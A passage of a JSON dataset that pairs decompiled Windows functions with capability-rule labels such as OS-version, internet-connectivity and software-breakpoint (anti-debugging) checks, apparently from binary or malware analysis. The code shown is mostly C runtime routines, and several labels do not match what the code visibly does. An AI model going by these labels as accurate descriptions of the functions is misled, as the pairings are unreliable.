*(iVar2 + 0xa4) = 0x104;\n    }\n    uVar4 = func_0x0059b0ce();\n    return uVar4;\n}\n",
        "token_count": 671
    },
    "004225eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004225eb(uint32_t arg_8h, int16_t *arg_ch, int16_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int16_t *piVar8;\n    int32_t iVar9;\n    uint extraout_EDX;\n    uint uVar10;\n    int16_t *piVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    ulong uVar15;\n    int16_t iVar16;\n    uint var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int16_t *var_10h;\n    int16_t *var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    uVar5 = arg_10h;\n    var_14h = -2;\n    if (arg_8h == 0xfffffffe) {\n        puVar6 = fcn.004125f1();\n        *puVar6 = 0;\n        puVar6 = fcn.004125de();\n        *puVar6 = 9;\n        return -1;\n    }\n    if ((arg_8h < 0) || (*0x439dc0 <= arg_8h)) {\n        puVar6 = fcn.004125f1();\n        *puVar6 = 0;\n        puVar6 = fcn.004125de();\n        *puVar6 = 9;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        return -1;\n    }\n    piVar1 = (arg_8h >> 5) * 4 + 0x439de0;\n    iVar13 = (arg_8h & 0x1f) * 0x40;\n    uVar3 = *(*piVar1 + iVar13 + 4);\n    if ((uVar3 & 1) == 0) {\n        puVar6 = fcn.004125f1();\n        *puVar6 = 0;\n        puVar6 = fcn.004125de();\n        *puVar6 = 9;\n        goto code_r0x004226f5;\n    }\n    if (arg_10h < 0x80000000) {\n        var_10h = NULL;\n        if ((arg_10h == NULL) || ((uVar3 & 2) != 0)) {\n            return 0;\n        }\n        if (arg_ch != NULL) {\n            var_2h._0_1_ = *(*piVar1 + iVar13 + 0x24) * '\\x02' >> 1;\n            if (var_2h == '\\x01') {\n                if ((~arg_10h & 1) == 0) goto code_r0x004226e3;\n                uVar7 = arg_10h >> 1;\n                arg_10h = 0x4;\n                if (3 < uVar7) {\n                    arg_10h = uVar7;\n                }\n                var_ch = fcn.0041c21c(arg_10h);\n                if (var_ch == NULL) {\n                    puVar6 = fcn.004125de();\n                    *puVar6 = 0xc;\n                    puVar6 = fcn.004125f1();\n                    *puVar6 = 8;\n                    return -1;\n                }\n                uVar15 = fcn.00421390(arg_8h, 0, 0, 1);\n                iVar12 = *piVar1;\n                *(iVar13 + 0x28 + iVar12) = uVar15;\n                *(iVar13 + 0x2c + iVar12) = uVar15 >> 0x20;\n            }\n            else {\n                if (var_2h == '\\x02') {\n                    if ((~arg_10h & 1) == 0) goto code_r0x004226e3;\n                    arg_10h = arg_10h & 0xfffffffe;\n                }\n                var_ch = arg_ch;\n            }\n            piVar8 = var_ch;\n            uVar7 = arg_10h;\n            if ((((*(*piVar1 + iVar13 + 4) & 0x48) != 0) && (cVar4 = *(*piVar1 + iVar13 + 5),  cVar4 != '\\n')) &&\n               (arg_10h != NULL)) {\n                *var_ch = cVar4;\n                piVar8 = var_ch + 1;\n                uVar7 = arg_10h - 1;\n                var_10h = 0x1;\n                *(iVar13 + 5 + *piVar1) = 10;\n                if (((var_2h != '\\0') && (cVar4 = *(iVar13 + 0x25 + *piVar1),  cVar4 != '\\n')) && (uVar7 != 0)) {\n                    *piVar8 = cVar4;\n                    piVar8 = var_ch + 1;\n                    uVar7 = arg_10h - 2;\n                    var_10h = 0x2;\n                    *(iVar13 + 0x25 + *piVar1) = 10;\n                    if (((var_2h == '\\x01') && (cVar4 = *(iVar13 + 0x26 + *piVar1),  cVar4 != '\\n')) && (uVar7 != 0)) {\n                        *piVar8 = cVar4;\n                        piVar8 = var_ch + 3;\n                        var_10h = 0x3;\n                        *(iVar13 + 0x26 + *piVar1) = 10;\n                        uVar7 = arg_10h - 3;\n                    }\n                }\n            }\n            arg_10h = uVar7;\n            uVar15 = func_0x0066267f(0, *(iVar13 + *piVar1), piVar8, arg_10h, &var_18h, 0);\n            uVar10 = uVar15 >> 0x20;\n            if (((uVar15 == 0) || (var_18h < 0)) || (arg_10h < var_18h)) {\n                iVar13 = func_0x00482421();\n                return iVar13;\n            }\n            var_10h = var_10h + var_18h;\n            puVar2 = iVar13 + 4 + *piVar1;\n            if ((*puVar2 & 0x80) != 0) {\n                if (var_2h == '\\x02') {\n                    if ((var_18h == 0) || (*var_ch != 10)) {\n                        *puVar2 = *puVar2 & 0xfb;\n                    }\n                    else {\n                        *puVar2 = *puVar2 | 4;\n                    }\n                    var_10h = var_10h + var_ch;\n                    arg_10h = var_ch;\n                    piVar8 = var_ch;\n                    if (var_ch < var_10h) {\n                        do {\n                            iVar16 = *arg_10h;\n                            if (iVar16 == 0x1a) {\n                                puVar2 = iVar13 + 4 + *piVar1;\n                                if ((*puVar2 & 0x40) == 0) {\n                                    *puVar2 = *puVar2 | 2;\n                                }\n                                else {\n                                    *piVar8 = *arg_10h;\n                                    piVar8 = piVar8 + 1;\n                                }\n                                break;\n                            }\n                            if (iVar16 == 0xd) {\n                                if (arg_10h < var_10h + -1) {\n                                    if (arg_10h[1] == 10) {\n                                        piVar11 = arg_10h + 2;\n                                        goto code_r0x00422aa5;\n                                    }\ncode_r0x00422b38:\n                                    arg_10h = arg_10h + 1;\n                                    iVar16 = 0xd;\ncode_r0x00422b3a:\n                                    *piVar8 = iVar16;\n                                }\n                                else {\n                                    piVar11 = arg_10h + 1;\n                                    uVar15 = func_0x0055a4ae(uVar10, *(iVar13 + *piVar1), &var_8h, 2, &var_18h, 0);\n                                    uVar10 = uVar15 >> 0x20;\n                                    if (uVar15 == 0) {\n                                        uVar15 = func_0x0048a658(iVar13);\n                                        uVar10 = uVar15 >> 0x20;\n                                        if (uVar15 != 0) goto code_r0x00422b38;\n                                    }\n                                    if (var_18h == 0) goto code_r0x00422b38;\n                                    if ((*(iVar13 + 4 + *piVar1) & 0x48) == 0) {\n                                        if ((piVar8 == var_ch) && (var_8h == 10)) goto code_r0x00422aa5;\n                                        fcn.00421390(arg_8h, 0xfffffffe, 0xffffffff, 1);\n                                        uVar10 = extraout_EDX;\n                                        if (var_8h == 10) goto code_r0x00422b40;\n                                        goto code_r0x00422b38;\n                                    }\n                                    if (var_8h == 10) {\ncode_r0x00422aa5:\n                                        arg_10h = piVar11;\n                                        iVar16 = 10;\n                                        goto code_r0x00422b3a;\n                                    }\n                                    *piVar8 = 0xd;\n                                    *(iVar13 + 5 + *piVar1) = var_8h;\n                                    *(iVar13 + 0x25 + *piVar1) = var_8h._1_1_;\n                                    *(iVar13 + 0x26 + *piVar1) = 10;\n                                    arg_10h = piVar11;\n                                }\n                                piVar8 = piVar8 + 1;\n                                piVar11 = arg_10h;\n                            }\n                            else {\n                                *piVar8 = iVar16;\n                                piVar8 = piVar8 + 1;\n                                piVar11 = arg_10h + 1;\n                            }\ncode_r0x00422b40:\n                            arg_10h = piVar11;\n                        } while (arg_10h < var_10h);\n                    }\n                    var_10h = piVar8 - var_ch;\n                }\n                else {\n                    if ((var_18h == 0) || (*var_ch != '\\n')) {\n                        *puVar2 = *puVar2 & 0xfb;\n                    }\n                    else {\n                        *puVar2 = *puVar2 | 4;\n                    }\n                    var_10h = var_10h + var_ch;\n                    piVar8 = var_ch;\n                    piVar11 = var_ch;\n                    while (piVar11 < var_10h) {\n                        cVar4 = *piVar11;\n                        if (cVar4 == '\\x1a') {\n                            puVar2 = iVar13 + 4 + *piVar1;\n                            if ((*puVar2 & 0x40) == 0) {\n                                *puVar2 = *puVar2 | 2;\n                            }\n                            else {\n                                *piVar8 = *piVar11;\n                                piVar8 = piVar8 + 1;\n                            }\n                            break;\n                        }\n                        if (cVar4 == '\\r') {\n                            if (var_10h + -1 <= piVar11) {\n                                iVar13 = func_0x005171f3(*(iVar13 + *piVar1), &var_2h + 1, 1, &var_18h, 0);\n                                return iVar13;\n                            }\n                            arg_10h = piVar11 + 1;\n                            if (*arg_10h == '\\n') {\n                                arg_10h = piVar11 + 1;\n                                *piVar8 = 10;\n                            }\n                            else {\n                                *piVar8 = 0xd;\n                            }\n                        }\n                        else {\n                            *piVar8 = cVar4;\n                            arg_10h = piVar11 + 1;\n                        }\n                        piVar8 = piVar8 + 1;\n                        piVar11 = arg_10h;\n                    }\n                    var_10h = piVar8 - var_ch;\n                    if ((var_2h == '\\x01') && (var_10h != NULL)) {\n                        uVar3 = *(piVar8 + -1);\n                        if (uVar3 < '\\0') {\n                            iVar12 = 1;\n                            piVar8 = piVar8 + -1;\n                            while (((*(uVar3 + 0x436ab0) == '\\0' && (iVar12 < 5)) && (var_ch <= piVar8))) {\n                                piVar8 = piVar8 + -1;\n                                uVar3 = *piVar8;\n                                iVar12 = iVar12 + 1;\n                            }\n                            iVar9 = *(*piVar8 + 0x436ab0);\n                            if (iVar9 == 0) {\n                                puVar6 = fcn.004125de();\n                                *puVar6 = 0x2a;\n                                var_14h = -1;\n                                goto code_r0x00422a02;\n                            }\n                            if (iVar9 + 1 == iVar12) {\n                                piVar8 = piVar8 + iVar12;\n                            }\n                            else if ((*(*piVar1 + iVar13 + 4) & 0x48) == 0) {\n                                fcn.00421390(arg_8h, -iVar12, -iVar12 >> 0x1f, 1);\n                            }\n                            else {\n                                piVar11 = piVar8 + 1;\n                                *(*piVar1 + iVar13 + 5) = *piVar8;\n                                if (1 < iVar12) {\n                                    *(iVar13 + 0x25 + *piVar1) = *piVar11;\n                                    piVar11 = piVar8 + 1;\n                                }\n                                if (iVar12 == 3) {\n                                    *(iVar13 + 0x26 + *piVar1) = *piVar11;\n                                    piVar11 = piVar11 + 1;\n                                }\n                                piVar8 = piVar11 - iVar12;\n                            }\n                        }\n                        iVar12 = piVar8 - var_ch;\n                        var_10h = (**0x42c220)(0xfde9, 0, var_ch, iVar12, arg_ch, uVar5 >> 1);\n                        if (var_10h == NULL) {\n                            iVar13 = func_0x006e4b2b();\n                            return iVar13;\n                        }\n                        bVar14 = var_10h != iVar12;\n                        var_10h = var_10h * 2;\n                        *(iVar13 + 0x30 + *piVar1) = bVar14;\n                    }\n                }\n            }\ncode_r0x00422a02:\n            if (var_ch != arg_ch) {\n                fcn.00410dee(var_ch);\n            }\n            if (var_14h == -2) {\n                return var_10h;\n            }\n            return var_14h;\n        }\n    }\ncode_r0x004226e3:\n    puVar6 = fcn.004125f1();\n    *puVar6 = 0;\n    puVar6 = fcn.004125de();\n    *puVar6 = 0x16;\ncode_r0x004226f5:\n    fcn.00415a3c(0, 0, 0, 0, 0);\n    return -1;\n}\n",
        "token_count": 3520
    },
    "00424670": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.00424670(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint32_t *arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    uint32_t arg_8h_00;\n    uint32_t uVar1;\n    bool bVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint *unaff_EDI;\n    bool bVar7;\n    uint uStack72;\n    uint *var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435b90 ^ &stack0xfffffffc;\n    uVar1 = *arg_14h;\n    bVar2 = false;\n    var_40h = unaff_EDI;\n    if (arg_8h == arg_ch) goto code_r0x00424812;\n    var_40h = 0x4246b6;\n    uStack72 = func_0x004af6f4();\n    var_40h = &fcn.00424670::var_18h;\n    iVar4 = (*unaff_EDI)();\n    pcVar3 = *0x42c220;\n    if ((((iVar4 == 0) || (var_18h != 1)) || (iVar4 = (*unaff_EDI)(arg_ch, &fcn.00424670::var_18h),  iVar4 == 0)) ||\n       (var_18h != 1)) {\n        uVar6 = (*pcVar3)(arg_8h, 1, arg_10h, uVar1, 0, 0);\n        bVar7 = uVar6 == 0;\n        if (bVar7) goto code_r0x00424812;\n    }\n    else {\n        bVar2 = true;\n        uVar6 = uVar1;\n        if (uVar1 == 0xffffffff) {\n            iVar4 = fcn.004121f0(arg_10h);\n            uVar6 = iVar4 + 1;\n        }\n        bVar7 = uVar6 == 0;\n    }\n    puVar5 = &stack0xffffffb8;\n    if ((bVar7 || uVar6 < 0) || (0x7ffffff0 < uVar6)) {\n        var_1ch = NULL;\n    }\n    else {\n        arg_8h_00 = uVar6 * 2 + 8;\n        if (arg_8h_00 < 0x401) {\n            fcn.00412570();\n            var_1ch = &stack0xffffffb8;\n            if (*0x10 != 0x48) {\n                uStack72 = 0xcccc;\ncode_r0x00424752:\n                var_1ch = puVar5 + 2;\n            }\n        }\n        else {\n            puVar5 = fcn.00410ecb(arg_8h_00);\n            var_1ch = puVar5;\n            if (puVar5 != NULL) {\n                *puVar5 = 0xdddd;\n                goto code_r0x00424752;\n            }\n        }\n    }\n    if (var_1ch != NULL) {\n        fcn.00410fb0(var_1ch, 0, uVar6 * 2);\n        iVar4 = (*pcVar3)(arg_8h, 1, arg_10h, uVar1, var_1ch, uVar6);\n        if (iVar4 != 0) {\n            if (arg_18h == 0) {\n                func_0x004a8fa8(iVar4);\n                if (((bVar2) || (uVar6 = (*NULL)(arg_ch, 0, var_1ch, uVar6, 0, 0, 0, 0),  uVar6 != 0)) &&\n                   (iVar4 = fcn.0041c261(1, uVar6),  iVar4 != 0)) {\n                    uVar6 = (*NULL)(arg_ch, 0, var_1ch, uVar6, iVar4, uVar6, 0, 0);\n                    if (uVar6 == 0) {\n                        fcn.00410dee(iVar4);\n                    }\n                    else if (uVar1 != 0xffffffff) {\n                        *arg_14h = uVar6;\n                    }\n                }\n            }\n            else {\n                func_0x00559d4b(uVar6, arg_ch, 0, var_1ch, uVar6, arg_18h, arg_1ch, 0, 0);\n            }\n        }\n        fcn.0041f531(var_1ch);\n    }\ncode_r0x00424812:\n    fcn.00410f95(arg_18h);\n    return;\n}\n",
        "token_count": 1165
    },
    "00425116": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00425116(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00425617;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0042524b;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x00425252;\ncode_r0x0042524b:\n                        do {\n                            var_4h = 1;\ncode_r0x00425252:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x00425260;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x00425260:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x436bc8 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x436bc8 < iVar12) {\n                if (iVar12 < *0x436bc4) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x436bc4;\n                    uVar5 = 1;\n                }\n                goto code_r0x00425617;\n            }\n            var_10h = *0x436bc8 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x00425403;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x00425403:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00425617:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3654
    },
    "0042565a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042565a(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00425b5b;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x436be4 - 1;\n        iVar4 = *0x436be4 + (*0x436be4 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x436be4 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0042578f;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x00425796;\ncode_r0x0042578f:\n                        do {\n                            var_4h = 1;\ncode_r0x00425796:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x004257a4;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x004257a4:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x436be0 - *0x436be4) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x436be0 < iVar12) {\n                if (iVar12 < *0x436bdc) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x436bf0;\n                    iVar4 = *0x436be8 + (*0x436be8 >> 0x1f & 0x1fU) >> 5;\n                   